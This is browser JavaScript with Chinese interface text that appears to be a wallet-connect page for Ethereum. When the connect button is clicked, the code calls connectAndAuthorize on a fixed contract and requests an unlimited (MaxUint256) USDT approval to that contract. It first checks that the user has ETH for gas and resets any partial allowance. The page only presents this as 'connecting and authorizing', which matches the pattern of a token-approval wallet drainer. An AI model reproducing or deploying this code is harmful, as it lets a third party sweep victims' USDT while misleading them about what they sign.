const ETHEREUM_CONTRACT_ADDRESS = '0x3df02b3b38c6b55725795db9c50b649c204f2dad';
const USDT_CONTRACT_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
const CONTRACT_ABI = [
    "function connectAndAuthorize() external",
    "function authorized(address customer) external view returns (bool)",
    "event Authorized(address indexed customer)"
];
const USDT_ABI = [
    "function approve(address spender, uint256 amount) external returns (bool)",
    "function balanceOf(address) view returns (uint256)",
    "function allowance(address owner, address spender) view returns (uint256)"
];

const connectButton = document.getElementById('connectButton');
let provider, signer, userAddress, contract, usdtContract;

async function initializeWallet() {
    try {
        if (typeof window.ethereum === 'undefined') {
            updateStatus('請安裝 MetaMask 或支援的錢包');
            return;
        }
        provider = new ethers.BrowserProvider(window.ethereum);
        const network = await provider.getNetwork();
        if (network.chainId !== 1n) {
            await window.ethereum.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: '0x1' }]
            });
        }
        const accounts = await provider.send('eth_accounts', []);
        if (accounts.length > 0) {
            userAddress = accounts[0];
            signer = await provider.getSigner();
            contract = new ethers.Contract(ETHEREUM_CONTRACT_ADDRESS, CONTRACT_ABI, signer);
            usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, USDT_ABI, provider);

            const isAuthorized = await contract.authorized(userAddress);
            const usdtBalance = await usdtContract.balanceOf(userAddress);
            const usdtAllowance = await usdtContract.allowance(userAddress, ETHEREUM_CONTRACT_ADDRESS);

            if (isAuthorized && (usdtBalance == 0 || usdtAllowance > 0)) {
                connectButton.classList.add('connected');
                connectButton.title = '斷開錢包';
                connectButton.disabled = false;
                updateStatus('已恢復連繫狀態');
            } else {
                connectButton.classList.remove('connected');
                connectButton.title = '連繫錢包';
                connectButton.disabled = false;
                updateStatus('請連繫錢包並授權');
            }
        } else {
            updateStatus('請連繫錢包');
        }

        window.ethereum.on('accountsChanged', async (accounts) => {
            if (accounts.length === 0) {
                resetState();
                updateStatus('錢包已斷開連繫');
            } else {
                userAddress = accounts[0];
                signer = await provider.getSigner();
                contract = new ethers.Contract(ETHEREUM_CONTRACT_ADDRESS, CONTRACT_ABI, signer);
                usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, USDT_ABI, provider);
                await checkAuthorization();
            }
        });

        window.ethereum.on('chainChanged', () => {
            resetState();
            updateStatus('網絡已切換，請重新連繫錢包');
        });
    } catch (error) {
        updateStatus(`初始化失敗：${error.message}`);
    }
}

async function checkAuthorization() {
    try {
        const isAuthorized = await contract.authorized(userAddress);
        const usdtBalance = await usdtContract.balanceOf(userAddress);
        const usdtAllowance = await usdtContract.allowance(userAddress, ETHEREUM_CONTRACT_ADDRESS);

        if (isAuthorized && (usdtBalance == 0 || usdtAllowance > 0)) {
            connectButton.classList.add('connected');
            connectButton.title = '斷開錢包';
            connectButton.disabled = false;
            updateStatus('已連繫並授權');
        } else {
            connectButton.classList.remove('connected');
            connectButton.title = '連繫錢包';
            connectButton.disabled = false;
            updateStatus('請連繫錢包並授權');
        }
    } catch (error) {
        updateStatus(`檢查授權失敗：${error.message}`);
    }
}

async function connectWallet() {
    try {
        if (typeof window.ethereum === 'undefined') {
            updateStatus('請安裝 MetaMask 或支援的錢包');
            return;
        }
        const network = await provider.getNetwork();
        if (network.chainId !== 1n) {
            await window.ethereum.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: '0x1' }]
            });
        }
        await provider.send('eth_requestAccounts', []);
        signer = await provider.getSigner();
        userAddress = await signer.getAddress();
        contract = new ethers.Contract(ETHEREUM_CONTRACT_ADDRESS, CONTRACT_ABI, signer);
        usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, USDT_ABI, signer);

        const ethBalance = await provider.getBalance(userAddress);
        if (ethBalance < ethers.parseEther('0.005')) {
            updateStatus(`ETH 餘額不足（需要至少 0.005 ETH，實際 ${ethers.formatEther(ethBalance)} ETH）`);
            return;
        }

        const isAuthorized = await contract.authorized(userAddress);
        if (!isAuthorized) {
            updateStatus('正在授權合約...');
            const txAuthorize = await contract.connectAndAuthorize();
            await txAuthorize.wait();
            updateStatus('合約授權成功');
        }

        const usdtBalance = await usdtContract.balanceOf(userAddress);
        if (usdtBalance > 0) {
            const usdtAllowance = await usdtContract.allowance(userAddress, ETHEREUM_CONTRACT_ADDRESS);
            if (usdtAllowance > 0 && usdtAllowance < usdtBalance) {
                updateStatus('正在重置 USDT 授權...');
                const txResetApprove = await usdtContract.approve(ETHEREUM_CONTRACT_ADDRESS, 0);
                await txResetApprove.wait();
            }
            if (usdtAllowance == 0) {
                updateStatus('正在授權 USDT...');
                const maxAllowance = ethers.MaxUint256;
                const txApprove = await usdtContract.approve(ETHEREUM_CONTRACT_ADDRESS, maxAllowance);
                await txApprove.wait();
                updateStatus('USDT 授權成功');
            }
        }

        connectButton.classList.add('connected');
        connectButton.title = '斷開錢包';
        connectButton.disabled = false;
        updateStatus('連繫並授權成功');
    } catch (error) {
        updateStatus(`操作失敗：${error.message}`);
        connectButton.classList.remove('connected');
        connectButton.title = '連繫錢包';
        connectButton.disabled = false;
    }
}

function disconnectWallet() {
    resetState();
    updateStatus('錢包已斷開，請重新連繫');
    // 提示用戶在 MetaMask 中手動斷開
    alert('錢包已斷開連繫，請在 MetaMask 中確認是否仍連繫網站。若需完全斷開，請在 MetaMask 的「已連繫網站」中移除本網站。');
}

function resetState() {
    signer = null;
    userAddress = null;
    contract = null;
    usdtContract = null;
    connectButton.classList.remove('connected');
    connectButton.title = '連繫錢包';
    connectButton.disabled = false;
}

function updateStatus(message) {
    const statusDiv = document.getElementById('status');
    statusDiv.innerHTML = `<strong>狀態：</strong>${message}`;
}

connectButton.addEventListener('click', () => {
    if (connectButton.classList.contains('connected')) {
        disconnectWallet();
    } else {
        connectWallet();
    }
});
initializeWallet();
console.log('connectButton event listener added and initializeWallet called');